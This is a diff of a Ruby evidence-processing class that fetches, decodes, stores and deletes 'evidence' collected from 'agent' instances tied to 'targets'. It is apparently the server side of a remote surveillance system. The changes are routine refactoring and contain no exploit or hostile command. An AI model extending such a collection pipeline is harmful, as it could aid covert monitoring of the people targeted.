@@ -39,6 +39,7 @@ class InstanceProcessor
     # get info about the agent instance from evidence db
     #@db = Mongo::Connection.new(RCS::DB::Config.instance.global['CN'], 27017).db("rcs")
     @agent = Item.agents.where({ident: ident, instance: instance}).first
+    @target = @agent.get_parent
     
     #@info = RCS::EvidenceManager.instance.instance_info @id
     raise "Agent \'#{ident}:#{instance}\' cannot be found." if @agent.nil?
@@ -56,13 +57,13 @@ class InstanceProcessor
       until sleeping_too_much?
         until @evidences.empty?
           resume
-          evidence_id = @evidences.shift
+          evidence_id = BSON::ObjectId(@evidences.shift)
 
           begin
             start_time = Time.now
 
             # get binary evidence
-            data = RCS::DB::GridFS.get(BSON::ObjectId(evidence_id), "evidence")
+            data = RCS::DB::GridFS.get(evidence_id, "evidence")
             raise "Empty evidence" if data.nil?
 
             raw = data.read
@@ -86,11 +87,11 @@ class InstanceProcessor
               end
             rescue EmptyEvidenceError => e
               trace :info, "[#{evidence_id}] deleting empty evidence #{evidence_id}"
-              RCS::DB::GridFS.delete(BSON::ObjectId(evidence_id), "evidence")
+              RCS::DB::GridFS.delete(evidence_id, "evidence")
               next
             rescue EvidenceDeserializeError => e
               trace :warn, "[#{evidence_id}] decoding failed for #{evidence_id}: #{e.to_s}, deleting..."
-              RCS::DB::GridFS.delete(BSON::ObjectId(evidence_id), "evidence")
+              RCS::DB::GridFS.delete(evidence_id, "evidence")
               next
             end
 
@@ -119,8 +120,7 @@ class InstanceProcessor
               # override original type
               ev_type = ev[:type] = ev.type
 
-              #store_evidence evidence
-              parsed = ev.store
+              ev.store @agent, @target
 
               #
               # FORWARDER: forward&sign parsed evidence
@@ -128,7 +128,7 @@ class InstanceProcessor
             end
 
             processing_time = Time.now - start_time
-            trace :info, "[#{evidence_id}] processed #{ev_type.upcase} for agent #{@agent['ident']} in #{processing_time} sec"
+            trace :info, "[#{evidence_id}] processed #{ev_type.upcase} for agent #{@agent['name']} in #{processing_time} sec"
 
           rescue Mongo::ConnectionFailure => e
             trace :error, "[#{evidence_id}] cannot connect to database, retrying in 5 seconds ..."
@@ -138,7 +138,7 @@ class InstanceProcessor
             trace :fatal, "FAILURE: " << e.to_s
             trace :fatal, "EXCEPTION: " + e.backtrace.join("\n")
           ensure
-            RCS::DB::GridFS.delete(BSON::ObjectId(evidence_id), "evidence")
+            RCS::DB::GridFS.delete(evidence_id, "evidence")
             trace :debug, "[#{evidence_id}] deleted raw evidence"
           end
         end
@@ -187,6 +187,7 @@ class InstanceProcessor
     if finished?
       trace :debug, "deferring work for #{@agent['instance']}"
       EM.defer @process
+      #EM.defer @restat
     end
   end
   
